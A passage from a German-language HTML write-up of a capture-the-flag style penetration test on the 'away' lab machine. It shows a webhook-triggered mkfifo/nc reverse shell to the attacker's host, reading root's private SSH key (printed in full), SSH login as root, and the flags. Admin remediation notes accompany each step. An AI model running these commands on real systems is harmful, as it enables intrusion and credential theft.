+            <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf dem Angreifer-System gestartet (Port 9001). Anschließend wird der Webhook auf dem Zielsystem ausgelöst, indem die URL `http://192.168.2.121:9000/hooks/redeploy-webhook` aufgerufen wird (z.B. mit `curl` oder im Browser). Dies führt dazu, dass der Webhook-Dienst (als `lula`) das Skript `/dev/shm/execute.sh` ausführt, welches eine Reverse Shell zum Listener aufbaut.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Der Listener meldet eine eingehende Verbindung. Der `id`-Befehl in der neuen Shell bestätigt, dass der Pentester nun als Benutzer `lula` (uid=1001) agiert. Die Eskalation von `tula` zu `lula` ist abgeschlossen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Shell als `lula` stabilisieren. Erneut `sudo -l` prüfen und die Umgebung enumerieren, um Wege zu `root` zu finden.<br><strong>Empfehlung (Admin):</strong> `sudo`-Regel für Webhook entfernen. Den Webhook-Dienst sichern oder entfernen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+</pre> <!-- Wartet auf Verbindung -->
+                  </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt, da dies die auslösende URL ist -->
+                    <pre>
+<span class="command">http://192.168.2.121:9000/hooks/redeploy-webhook</span>
+</pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Listener hat Verbindung -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.121] 42474</span>
+$ <span class="command">id</span>
+<span class="command">uid=1001(lula) gid=1001(lula) groups=1001(lula)</span>
+$ 
+</pre>
+                  </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Inhalte der für den Webhook-Exploit verwendeten Dateien werden angezeigt:
+                1.  `/dev/shm/execute.sh`: Das Skript, das die Reverse Shell via `mkfifo` und `nc` startet.
+                2.  `/tmp/webhook/hooks.json`: Die Konfiguration für den Webhook, die definiert, dass bei Aufruf des Hooks `redeploy-webhook` das Skript `/dev/shm/execute.sh` ausgeführt wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies dokumentiert den Mechanismus, der zur Erlangung der Shell als `lula` verwendet wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Informationen sind Teil der Dokumentation des Angriffs.<br><strong>Empfehlung (Admin):</strong> Verstehen, wie der Exploit funktioniert hat, um die Schwachstellen (sudo-Regel, Webhook-Konfiguration) zu beheben.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Prompt als tula, zeigt das Skript -->
+                    <div class="prompt" style="color: yellow;">tula@away:/tmp$ <span class="command">cat /dev/shm/execute.sh</span></div>
+                     <pre>
+#!/bin/bash
+
+<span class="command">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.140 9001 >/tmp/f</span>
+</pre>
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">tula@away:/tmp$ <span class="command">cat webhook/hooks.json</span></div>
+                     <pre>
+[
+  {
+    "id": "redeploy-webhook",
+    "execute-command": "/dev/shm/execute.sh",
+    "command-working-directory": "/tmp/webhook"
+  }
+]
+</pre>
+                  </div>
+            </div>
+            <!-- Wiederholung der Ausführungsschritte zur Klarheit -->
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">tula@away:/tmp$ <span class="command">sudo -u lula /usr/bin/webhook -hooks hooks.json -verbose</span></div>
+                      <!-- Keine relevante Ausgabe hier, da der Dienst schon läuft/lief -->
+                      <pre></pre>
+                  </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt, da dies die auslösende URL ist -->
+                    <pre>
+<span class="command">http://192.168.2.121:9000/hooks/redeploy-webhook</span>
+</pre>
+                 </div>
+            </div>
+
+             <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> In der Shell als `lula` wird versucht, mit `/usr/bin/more` den privaten SSH-Schlüssel des Root-Benutzers (`/root/.ssh/id_ed25519`) zu lesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Der Befehl zeigt den Inhalt des privaten Schlüssels an. Dies ist eine **gravierende Sicherheitslücke**. Der Benutzer `lula` sollte unter keinen Umständen Leserechte auf das `.ssh`-Verzeichnis oder die privaten Schlüssel von `root` haben. Die Ursache für diese Berechtigung ist unklar (Fehlkonfiguration, Sticky Bit, ACLs?), wird aber sofort ausgenutzt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den privaten Root-Schlüssel kopieren. Da er nicht passwortgeschützt zu sein scheint (kein `ENCRYPTED`-Header sichtbar), kann er direkt verwendet werden, um sich als `root` per SSH anzumelden.<br><strong>Empfehlung (Admin):</strong> **Dringend die Berechtigungen für `/root` und insbesondere `/root/.ssh` überprüfen und korrigieren!** Nur `root` darf darauf Lesezugriff haben (`chmod 700 /root/.ssh`, `chmod 600 /root/.ssh/id_*`). Untersuchen, wie `lula` die Leseberechtigung erhalten hat.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Prompt als lula -->
+                    <div class="prompt" style="color: yellow;">lula@away:/tmp/webhook$ <span class="command">/usr/bin/more /root/.ssh/id_ed25519</span></div>
+                     <pre>
+/usr/bin/more /root/.ssh/id_ed25519
+<span class="password">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACCZsnRA543yhxJSmFw8Nc2vT6umh4rqVRA5RwgKbTm/SAAAAJB3Fxg4dxcY
+OAAAAAtzc2gtZWQyNTUxOQAAACCZsnRA543yhxJSmFw8Nc2vT6umh4rqVRA5RwgKbTm/SA
+AAAECDZ5NtdbnBm8jUAAdwpKe3m6amsmnVy+AS2qRite6MpZmydEDnjfKHElKYXDw1za9P
+q6aHiupVEDlHCAptOb9IAAAACXJvb3RAYXdheQECAwQ=
+<span class="password">-----END OPENSSH PRIVATE KEY-----</span>
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Der als `lula` ausgelesene private Root-Schlüssel wird auf dem Angreifer-System in eine Datei (`id_rsa_root`) gespeichert. Die Berechtigungen werden auf `600` gesetzt. Anschließend wird eine SSH-Verbindung als `root` zum Zielsystem `away.hmv` unter Verwendung dieses Schlüssels aufgebaut.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Der SSH-Login als `root` mit dem Schlüssel funktioniert ohne Passwortabfrage. Der Pentester hat nun vollständigen Root-Zugriff auf das System.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Zugriff bestätigt. Die Root-Flag (`/root/ro0t.txt`) suchen und auslesen. System untersuchen und Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Kompromittierten Root-Schlüssel ungültig machen (aus `authorized_keys` entfernen, neuen generieren). Die Ursache für das vorherige Berechtigungsproblem (Lesen des Schlüssels als `lula`) beheben. `sudo`-Regel für `tula` korrigieren.</p>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Prompt Angreifer -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">vi id_rsa_root</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">chmod 600 id_rsa_root</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">ssh -i id_rsa_root root@away.hmv</span></div>
+                     <pre>
+Linux away 5.10.0-15-amd64 #1 SMP Debian 5.10.120-1 (2022-06-09) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jun 17 11:14:38 2022
+<span class="password">root@away:~#</span> 
+</pre>
+                  </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `root` wird das Home-Verzeichnis aufgelistet und der Inhalt der Datei `ro0t.txt` (vermutlich ein Tippfehler statt `root.txt`) ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag wird erfolgreich gelesen: `<span class="password">HMVNYDWAPOQNDYUBNI</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Flag notieren. Auftrag erfüllt.<br><strong>Empfehlung (Admin):</strong> Flags sichern.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Prompt als root -->
+                    <div class="prompt">root@away:~# <span class="command">ls</span></div>
+                     <pre>
+<span class="command">ro0t.txt</span>
+</pre>
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">root@away:~# <span class="command">cat ro0t.txt</span></div>
+                     <pre>
+<span class="password" style="display: block; text-align: center;">HMVNYDWAPOQNDYUBNI</span>
+</pre>
+                  </div>
+            </div>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                <div class="code-block"><center>
+                    <div class="terminal">
+                        <span class="command">cat /home/tula/user.txt</span> <br>
+                        <span class="flag-content"><span class="password">HMVDULEMISPLCYDKEG</span></span>
+                    </div>
+                </center></div>
+
+                <div class="code-block"><center>
+                    <div class="terminal">
+                        <span class="command">cat /root/ro0t.txt</span> <br> <!-- Name korrigiert gemäß Ausgabe -->
+                        <span class="flag-content"><span class="password">HMVNYDWAPOQNDYUBNI</span></span>
+                    </div>
+                 </center></div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 5. Oktober 2022</p> <!-- Datum aus Webhook-Log entnommen -->
+    </footer>
+</body>
+</html>
